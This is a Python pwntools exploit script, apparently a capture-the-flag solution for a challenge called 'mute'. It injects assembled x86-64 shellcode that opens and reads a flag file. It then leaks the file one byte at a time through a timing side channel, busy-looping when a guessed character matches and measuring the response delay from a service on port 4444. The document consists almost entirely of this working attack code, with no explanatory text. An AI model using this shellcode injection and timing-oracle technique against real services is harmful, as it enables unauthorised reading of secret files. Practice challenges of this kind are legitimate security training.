from pwn import *
import string
import time

def check(s, i):
    sc_source = '''
xor rax, rax
push rax
mov al, 0x2
mov r8, 0x67616c662f2f2f2e
push r8
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
xor rax, rax
mov rsi, rsp
mov dl, 0xff
syscall
xor r8, r8
mov r8d, 0xffffffff
xor rcx, rcx
mov rcx, [rsp + SECTION*8]
shr rcx, SHIFT
cmp cl, TESTCHAR
jz .loop
jmp .fin
.loop:
dec r8
cmp r8, 0
jne .loop
.fin:
'''.replace('SECTION', str(i/8)).replace('SHIFT', str(8*(i%8))).replace('TESTCHAR', str(ord(s)))
    sc = asm(sc_source, arch='amd64', os='linux')
    sc += "\x00"*(0x1000 - len(sc))

    starttime = time.time()
    endtime = None
#    proc = process('./mute')
    proc = remote('127.0.0.1', 4444)
    proc.recvline()
    proc.send_raw(sc)

    try:
        proc.recvline(timeout=1)
    except:
        pass
    finally:
        proc.close()
        endtime = time.time() - starttime
        if(endtime >= 1):
            return True
        else:
            return False

def main():
    flag = ""
    while True:
        for x in string.printable:
            if check(x,len(flag)):
                print("Found char: " + x)
                flag += x
                break
        else:
            break
    print("Flag: " + flag)

if __name__ == '__main__':
    main()
